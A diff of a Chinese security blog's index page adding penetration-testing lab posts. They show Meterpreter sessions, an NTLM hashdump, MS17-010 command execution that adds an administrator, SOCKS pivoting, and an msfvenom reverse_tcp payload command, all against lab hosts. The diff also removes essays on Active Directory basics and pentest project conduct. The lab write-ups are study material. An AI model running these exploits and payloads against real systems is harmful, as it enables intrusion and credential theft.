上传免杀exe  使用bind_tcp 获取session2</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; set rhost 10.10.1.130</span><br><span class="line">    rhost &#x3D;&gt; 10.10.1.130</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; exploit </span><br><span class="line">    [*] Started bind TCP handler against 10.10.1.130:4444</span><br><span class="line">    [*] Sending stage (200262 bytes) to 10.10.1.130</span><br><span class="line">    [*] Meterpreter session 2 opened (10.10.1.128:53009 -&gt; 10.10.1.130:4444) at 2021-11-17 10:59:40 -0500</span><br><span class="line">继续上面的流程  提权 获取网络环境 定位域控 </span><br><span class="line">    meterpreter &gt; run get_local_subnets </span><br><span class="line">    [!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">    [!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">    Local subnet: 10.10.1.0&#x2F;255.255.255.0</span><br><span class="line">    Local subnet: 10.10.10.0&#x2F;255.255.255.0</span><br><span class="line">    meterpreter &gt; run autoroute  -s 10.10.10.0&#x2F;24</span><br><span class="line">    [!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">    [!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">    [*] Adding a route to 10.10.10.0&#x2F;255.255.255.0...</span><br><span class="line">    [+] Added route to 10.10.10.0&#x2F;255.255.255.0 via 10.10.1.130</span><br><span class="line">    [*] Use the -p option to list all active routes</span><br><span class="line">获取到ntlm hash  解密</span><br><span class="line">    meterpreter &gt; hashdump </span><br><span class="line">    Administrator:500:aad3b435b51404eeaad3b435b51404ee:357bec0ee1f524c62ba536fcd3f74472:::</span><br><span class="line">    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">定位到10.10.10.165为域控DC</span><br><span class="line">继续对dc进行信息收集 </span><br><span class="line">proxychains nmap -sT -sV -Pn -n -p  80,139,445,21,3389,3306  --script&#x3D;smb-vuln-ms* 10.10.10.165</span><br><span class="line">    PORT     STATE  SERVICE       VERSION</span><br><span class="line">    21&#x2F;tcp   closed ftp</span><br><span class="line">    80&#x2F;tcp   closed http</span><br><span class="line">    139&#x2F;tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">    445&#x2F;tcp  open   microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: ATTACK)</span><br><span class="line">    3306&#x2F;tcp closed mysql</span><br><span class="line">    3389&#x2F;tcp open   ms-wbt-server Microsoft Terminal Services</span><br><span class="line">    Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">    Host script results:</span><br><span class="line">    |_smb-vuln-ms10-054: false</span><br><span class="line">    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">    | smb-vuln-ms17-010: </span><br><span class="line">    |   VULNERABLE:</span><br><span class="line">    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">    |     State: VULNERABLE</span><br><span class="line">    |     IDs:  CVE:CVE-2017-0143</span><br><span class="line">    |     Risk factor: HIGH</span><br><span class="line">    |       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">    |        servers (ms17-010).</span><br><span class="line">    |           </span><br><span class="line">    |     Disclosure date: 2017-03-14</span><br><span class="line">    |     References:</span><br><span class="line">    |       https:&#x2F;&#x2F;blogs.technet.microsoft.com&#x2F;msrc&#x2F;2017&#x2F;05&#x2F;12&#x2F;customer-guidance-for-wannacrypt-attacks&#x2F;</span><br><span class="line">    |       https:&#x2F;&#x2F;technet.microsoft.com&#x2F;en-us&#x2F;library&#x2F;security&#x2F;ms17-010.aspx</span><br><span class="line">    |_      https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2017-0143</span><br><span class="line">探测到3389服务 http服务 以及可能存在ms17010漏洞</span><br><span class="line">尝试利用ms17010 反弹session失败  但是可以执行命令</span><br><span class="line">于是添加用户 并加入管理员组  然后端口转发 将3389转发到kali本地 用本机win10去连接远程桌面</span><br><span class="line">    msf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; run</span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Target OS: Windows Server 2016 Standard 14393</span><br><span class="line">    [*] 10.10.10.165:445      - Built a write-what-where primitive...</span><br><span class="line">    [+] 10.10.10.165:445      - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">    [+] 10.10.10.165:445      - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">    [*] 10.10.10.165:445      - Getting the command output...</span><br><span class="line">    [*] 10.10.10.165:445      - Executing cleanup...</span><br><span class="line">    [+] 10.10.10.165:445      - Cleanup was successful</span><br><span class="line">    [+] 10.10.10.165:445      - Command completed successfully!</span><br><span class="line">    [*] 10.10.10.165:445      - Output for &quot;net user abc !@#QWEasd123 &#x2F;add&quot;:</span><br><span class="line"></span><br><span class="line">    �����ɹ����ɡ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    msf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; set command net localgroup administrators abc &#x2F;add</span><br><span class="line">    command &#x3D;&gt; net localgroup administrators abc &#x2F;add</span><br><span class="line">    msf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; run</span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Target OS: Windows Server 2016 Standard 14393</span><br><span class="line">    [*] 10.10.10.165:445      - Built a write-what-where primitive...</span><br><span class="line">    [+] 10.10.10.165:445      - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">    [+] 10.10.10.165:445      - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">    [*] 10.10.10.165:445      - Getting the command output...</span><br><span class="line">    [*] 10.10.10.165:445      - Executing cleanup...</span><br><span class="line">    [+] 10.10.10.165:445      - Cleanup was successful</span><br><span class="line">    [+] 10.10.10.165:445      - Command completed successfully!</span><br><span class="line">    [*] 10.10.10.165:445      - Output for &quot;net localgroup administrators abc &#x2F;add&quot;:</span><br><span class="line"></span><br><span class="line">    �����ɹ����ɡ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    </span><br><span class="line">    portfwd add -l 3389 -p 3389 -r 10.10.10.165</span><br><span class="line">    # netstat -tnlp</span><br><span class="line">    Active Internet connections (only servers)</span><br><span class="line">    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1721&#x2F;ruby           </span><br><span class="line">    tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      1721&#x2F;ruby           </span><br><span class="line">    tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      1721&#x2F;ruby           </span><br><span class="line">    tcp        0      0 127.0.0.1:1089          0.0.0.0:*               LISTEN      1721&#x2F;ruby    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/18/O1RmyVUEz3ArjqT.png" alt="image-20211118002527585"></p>
+<h4 id="成功拿到域控DC。"><a href="#成功拿到域控DC。" class="headerlink" title="成功拿到域控DC。"></a>成功拿到域控DC。</h4><p><img src="https://i.loli.net/2021/11/18/RYKOtfBAVzDIeNs.png" alt="image-20211118002639289"></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/11/17/%E6%9A%97%E6%9C%88%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE7WP%EF%BC%9A/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-msf 自动路由+sock代理实现内网穿透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="msf-自动路由-socks代理-端口转发实现内网穿透"><a href="#msf-自动路由-socks代理-端口转发实现内网穿透" class="headerlink" title="msf 自动路由+socks代理+端口转发实现内网穿透"></a>msf 自动路由+socks代理+端口转发实现内网穿透</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">获取内网网段：</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">设置自动路由：（直接使用post&#x2F;multi&#x2F;manager&#x2F;autoroute可能会失败，建议使用以下命令:）</span><br><span class="line"></span><br><span class="line"> meterpreter &gt; run autoroute -s 192.168.20.0&#x2F;24</span><br><span class="line"></span><br><span class="line">#查看是否设置成功</span><br><span class="line"></span><br><span class="line"> meterpreter &gt; run autoroute -p </span><br><span class="line">#扫描该网段所有主机（可以尝试多个payload扫描）</span><br><span class="line"> meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.20.0&#x2F;24</span><br><span class="line"> </span><br><span class="line"> #注意：使用了自动路由后，可以挂起会话然后使用msf中的其它模块进行端口扫描等操作，是可以连接到目标网络的</span><br><span class="line"> #比如使用tcp端口扫描等等。 search potscan use 5 set rhosts 192.168.20.0&#x2F;24 run</span><br><span class="line"> #但是这样扫描效率很低，如果需要使用外部工具（非msf自带的）就需要设置socks代理</span><br></pre></td></tr></table></figure>
+
+<h4 id="设置socks代理"><a href="#设置socks代理" class="headerlink" title="设置socks代理"></a>设置socks代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">search socks</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">netstat -tnlp</span><br><span class="line">set srvport 1080</span><br><span class="line">net stat -tnlp #查看是否开启成功</span><br><span class="line">vim &#x2F;etc&#x2F;proxychains4.conf </span><br><span class="line">#添加 socks4 127.0.0.1 1080 （如果后面还要跨网段 继续在最后添加就行 改一下端口）</span><br><span class="line">#现在就可以使用proxychains 直接对二层内网进行渗透</span><br><span class="line">proxychains nmap -sT -sV -Pn -n -p 22,80,135,139,445 --script&#x3D;smb-vuln-ms* 192.168.20.128</span><br></pre></td></tr></table></figure>
+
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#把内网的服务通过端口转发出来 就可以在本机上进行渗透 访问本机即可</span><br><span class="line">portfwd add -l 8080 192.168.20.128 -p 8080</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/11/14/msf%20%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1+sock%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-搭建简单域环境" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="搭建简单域环境"><a href="#搭建简单域环境" class="headerlink" title="搭建简单域环境"></a>搭建简单域环境</h2><p>拓扑：</p>
+<p>域控：192.168.30.10  操作系统：win server 2012</p>
+<p>内网：192.168.10.0  192.168.20.0  </p>
+<p>内网主机：</p>
+<p>win 2008 192.168.10.100  </p>
+<p>win 8 192.168.10.200  192.168.20.200</p>
+<p>win 7 192.168.20.100  192.168.30.100</p>
+<p>思路：</p>
+<p>从 外网08 server进入，进行横向到win 8。</p>
+<p>通过win 8纵向到20段的win 7。</p>
+<p>再通过win 7纵向到30段的域控。</p>
+<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ncpa.cpl</span><br><span class="line"></span><br><span class="line">dcpromo</span><br><span class="line"></span><br><span class="line">services.msc</span><br><span class="line"></span><br><span class="line">netstat -ntlp</span><br><span class="line">mstsc</span><br><span class="line">systempropertiesadvanced</span><br><span class="line">control</span><br><span class="line">chcp  65001解决msf乱码</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.132.128 LPORT&#x3D;4444 -f c</span><br><span class="line"></span><br><span class="line">#windows快速查找提权exp</span><br><span class="line">systeminfo&gt;micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find &#x2F;i &quot;%i&quot;|| @echo %i you can fuck)&amp;del &#x2F;f &#x2F;q &#x2F;a micropoor.txt</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/11/14/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-漏洞挖掘" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -519,625 +885,9 @@
 
 
   
-    <article id="post-大概是孤独" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/">大概是孤独</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/" class="archive-article-date">
-        <time datetime="2021-10-07T11:37:00.876Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>写了很多，删了很多，或许人都有矫情的时候吧，又或许还没有坚强到轻易让别人看穿自己软弱的地步。</p>
-<p>生活本就是自扫庭前雪，自己去污秽。</p>
-<p>说到底还是闲的</p>
-<p>记得专攻术业，好好生活，先自爱，再爱人。愿你我共勉。</p>
-<p><img src="https://i.loli.net/2021/10/07/ZqEaWUsCwrlnIxi.jpg" alt="微信图片_20211007193606"></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-内网基础：" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h2><p>1、<strong>工作组：</strong>工作组内所有计算机是对等的。工作组不能集中管理。</p>
-<p>2、<strong>域：</strong>域可以说是工作组的升级，域内的安全管理控制机制更加严格，用户需要访问域需要有合法的身份登录才行，之后才能访问域内资源。用户在域内的身份不同，能访问的资源也不同。</p>
-<p>3、<strong>域控：</strong>域控是域内一台类似管理域内机器的计算机，通俗来说像一个单位的门禁系统。当有用户访问域内资源时，域控会鉴别计算机是否属于这个域。域控是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行，域内所有用来验证身份的账号和密码散列值都保存在域控制器中。</p>
-<p>4、**<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/282319.html">域环境：</a>**单域、父域、子域、域树、域森林。</p>
-<p>5、<strong>域名服务器：</strong>域名服务器就是DNS，在现实用IP配置也是经常会配置的。实际上域中的计算机是使用DNS来定位域控制器、服务器、网络服务等。所以域的名字就是DNS域的名字。所以在内网渗透中，大多数情况下是通过寻找DNS服务器来定位域控制器的。因为域控制器和DNS服务都配置在同一台机器上！</p>
-<p>6、<strong>活动目录：</strong>AD是域环境中提供目录服务的组件。</p>
-<p>7、<strong>域控制器和活动目录的区别：</strong>把域内的众多资源（计算机、用户、用户组、打印机、共享文件等）分门别类有序的放在一个大的仓库中，并将检索信息整理好以便查找和访问这些资源的一个数据库就是活动目录数据库简称AD库。要实现域环境其实就是要安装AD。如果内网中的一台机器上安装了AD，那么它就成为了域控DC。域控就是安装了活动目录的计算机。</p>
-<p>8、<strong>安全域的划分：</strong>在一个路由器连接的网络中，可以将网络划分为内网、DMZ、以及外网三个区域。这三个区域需要完成不同的任务，因此需要设置不同的访问策略。（ACL）</p>
-<p>9、<strong>域中计算机的分类：</strong></p>
-<ul>
-<li>域控</li>
-<li>成员服务器</li>
-<li>客户机</li>
-<li>独立服务器：独立服务器不在域中，也没有安装活动目录。</li>
-</ul>
-<p>10、<strong>域内权限解读：</strong>A-G-DL-P策略（A:用户账户 G：表示全局组 U：表示通用组 DL：表示域本地组 P：表示资源权限）</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/10/01/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%EF%BC%9A/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安全服务项目防坑指南" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="安全服务项目防坑指南"><a href="#安全服务项目防坑指南" class="headerlink" title="安全服务项目防坑指南"></a>安全服务项目防坑指南</h2><p>为规范安全服务项目实施过程，保证实施质量，提高实施效率，特制定本防坑指南。</p>
-<h3 id="十三个不要"><a href="#十三个不要" class="headerlink" title="十三个不要"></a>十三个不要</h3><ol>
-<li>正式文档或者邮件编写完成后，<strong>自己通读几遍</strong>，检查主题和正文是否规范，相关附件是否准确，正文内容<strong>不要留白或者出现错别字</strong>（包括语句不通顺、客户文字写错等低级错误）</li>
-<li><strong>有问题就提！！！</strong>不要把问题累积到自己身上，处理不了会造成更大的问题。（但是<strong>要注意提问的艺术</strong>，不急的事情自己先搜索或者其它方式了解，如果还是找不到记得带着细节去咨询，要高效提问，不要浪费彼此的时间）</li>
-<li>在正式场合或正式文档里，不要用<strong>应该是、可能是、好像是</strong>这种不确定的答案，<strong>要求准确把信息传递给客户。</strong></li>
-<li>实在不能确定的问题，<strong>不要轻易给客户方做出你没把握或者不确定的承诺</strong>（一定要预估风险、留有余地）可以给客户说需要确认一下，约在什么时间点给他回复。</li>
-<li>不要总是只提出问题，<strong>在提出问题的时候，思考并提出你认为的解决方案</strong>。</li>
-<li><strong>问题遇到了就遇到了，不要害怕或者逃避。没什么大不了。</strong>把它想成是一个好事，要是自己处理好了就牛逼了。</li>
-<li><strong>不要轻易说“不会”，“做不到”，协调周边其它资源帮忙</strong>做也是做到的一种方式。</li>
-<li>对于一些有<strong>争议、复杂、可能被截屏的事情，不要微信文字沟通！！！用电话！！！</strong></li>
-<li>需要别人配合的、非简单事项，<strong>给出大概的时间点</strong>，如（麻烦在xx时间点完成） 尽量不要用“尽快”等词语。一般尽快都不会快。</li>
-<li><strong>不要重复造轮子</strong>，很多文档或者问题思路其实已经有了现成的了，多问一下。</li>
-<li><strong>一个好的问题</strong>可以遵循以下形式进行组织：背景信息–遇到的问题–可能的解决方案–尝试解决之后的效果–想要获得什么样的帮助。</li>
-<li><strong>背景信息尤其重要</strong>，别人能不能理解你的问题，能不能代入到你的场景里给出合理建议，全在你的信息描述里。</li>
-<li><strong>沟通或者汇报不要模模糊糊，思考以下几个方面：</strong></li>
-</ol>
-<ul>
-<li>你想做什么？</li>
-<li>想达到什么结果？</li>
-<li>打算怎么做？</li>
-<li>还有没有更好的方案？</li>
-<li>估计会有什么困难和阻力？</li>
-<li>你打算怎么办？</li>
-<li>有什么需要支持？</li>
-</ul>
-<h3 id="项目实施前"><a href="#项目实施前" class="headerlink" title="项目实施前"></a>项目实施前</h3><ol>
-<li>务必与相关人员（合作伙伴对接人、销售、客户对接人）沟通清楚，了解项目前期实施（如相关售前交流的方案、PPT 等资料）或沟通项目实施的目标、需求、时间、地点、注意事项。</li>
-<li>准备项目实施启动PPT、方案、实施计划表等（依实际情况而定，计划表主要便于客户或合作方知悉项目进度）。</li>
-<li>了解项目要实现的目标，了解每项工作的目的，了解客户对于项目的实际需求。</li>
-<li>通读项目技术规范书（合同里有附带，有时候需要主动向销售索取），充分掌握项目规定工作内容项以及后期验收需要的相关材料。</li>
-</ol>
-<h3 id="项目实施中"><a href="#项目实施中" class="headerlink" title="项目实施中"></a>项目实施中</h3><ul>
-<li><strong>关于沟通</strong></li>
-</ul>
-<ol>
-<li>项目最大的问题是未知风险，首次现场沟通后对关于进度、服务内容范围、客户目标、实施难度等进行预判，对于能与客户、销售沟通部分，先行与客户销售沟通清楚，提出解决方案。不能的地方与领导沟通，提出解决方案。</li>
-<li>影响项目评价最大的两个人：1）客户方领导 2) 销售  所以在项目实施过程中，多和这两个人沟通，了解他们的想法、目的和需求。简单来讲“多沟通、多做事、多装逼”</li>
-<li>项目实施更看重结果和目标，因此项目经理凡是觉得<strong>有利于目标完成</strong>，想提出的需求或者需要领导协调的资源就提出来，是否能落地让领导去判断。</li>
-<li>项目最好的结果是共赢。<strong>客户有收获，我们有收获，销售有收获</strong>（销售站的角度比较高，往往更看重是否能给他带来后续项目的机会，如后续的服务和产品，因此在实施过程中，发现有这样的机会点就可以和销售先沟通，增加好感度）</li>
-<li>对于客户方一些拍脑袋等不合理的决定，你就从技术的角度提出来，是哪方面不合理，然后建议的解决方案是怎么样的，<strong>避免给自己平添很多的麻烦。</strong></li>
-<li><strong>每天预留一点时间跳出繁琐事务，从全局思考</strong>：工作安排是否合理，流程是否需要优化，是否能更好的完成项目目标，否则很容易沉浸于具体工作，造成客户看不到，销售不清楚，自己还搞得很累的实施情况。</li>
-<li>给客户讲的东西，也要具备可落地的操作性，如需要谁在什么时间点做什么达到怎么样的效果。</li>
-<li>尽量把客户对实施的意见仅仅留在现场，在现场和客户沟通清楚意见内容并尽量消除该意见，避免被反馈给销售或者客户领导。</li>
-<li>确信正确的事情需要或需要实施的动作，如果客户或者销售不配合就强硬一点，告知不配合的风险在哪里，实在沟通不了也要把锅甩出去，合理避免风险。</li>
-<li>给客户提供方案，引导客户同意你想实施的方案，但不代替客户做决定。</li>
-<li>遇到突发情况，重要情况第一时间同步给项目经理、销售。</li>
-<li>先目的，后措施，先分类，后解决，先整体，后细节。</li>
-<li>学会深度思考，不要以为客户或者伙伴的需求就一定是真实的需求，弄清楚这个需求背后的原因才是重要的。</li>
-</ol>
-<ul>
-<li><strong>实施中其它注意事项</strong></li>
-</ul>
-<ol>
-<li>分清楚工作内容的层次，优先解决重要的事情、领导关注的事情，不要纠结于某个影响不大的技术细节。</li>
-<li>涉及对重要的信息系统、服务器，尽量我们指导，客户自己或相关责任厂商实施操作。如有必要的情况下，在做操作之前，要向客户对接人、业务对接人确认，尽量在客户方陪同下进行操作，总而言之，一定<strong>尽可能规避我们的风险。</strong></li>
-<li>实施的前几天是关键点：问题、实施难度、效果尽量都放大一些，协调最好的资源，做出较好的效果，实施、文档都干漂亮些，与客户和销售建立信任关系，度过了前期，后期实施过程中就比较方便。</li>
-<li>让客户明白具体要怎么配合，为什么要配合，配合后达到的目的，每个阶段可能要做什么事情，哪些是关键点。</li>
-<li><strong>在项目的实施过程中，什么都确认到具体项，</strong>比如开会的具体时间、具体楼房以及门牌号、具体实际对接人，避免客户有模棱两可的描述，以防真正碰到情况的时候手忙脚乱。</li>
-<li>项目实施期间，在知晓技术规范书中要求的验收材料的前提下，有意识的准备后期验收所需材料，存放于单独文件夹内，并做好分类，避免项目结束准备验收或总结材料时，文件太多、太杂导致难以找到所需文件。</li>
-<li>在编写项目方案，验收报告或者其它文档时，如遇<strong>编写内容比较复杂、耗时较长、文档数量较多的，需要首先确定客户的编写要求，或者先拟定文档模板，与客户确定模板准确性后，再进行剩余文档的编写，</strong>以免造成花了大力气编写的文档在交付时被驳回的情况。</li>
-<li>工作追求完成质量是对客户负责，追求完成度那是对公司负责，追求完善优化是对自己负责。</li>
-</ol>
-<h3 id="渗透项目实施中注意事项"><a href="#渗透项目实施中注意事项" class="headerlink" title="渗透项目实施中注意事项"></a>渗透项目实施中注意事项</h3><ol>
-<li><strong>参与做渗透测试项目的，一定不能用手头客户的出口网络去测，千万不要触碰这条底线，</strong>如不遵守的进行通报、罚款、降薪，情节严重的甚至开除。请大家务必遵守实施规范，不要节外生枝。</li>
-<li>严格按照客户授权的测试时间、测试范围以及规范进行渗透工作，切勿超出规定范围进行测试（如虽不在范围，但可能存在极大漏洞风险，导致可能威胁客户整体网络安全，一定和客户沟通，是否需要对范围外的资产进行测试）</li>
-<li>增删改功能处不能使用自动化工具，如sqlmap,burp自动化插件等。</li>
-<li>生产环境不能进行登录大型扫描，登录扫描会写入大量脏数据。</li>
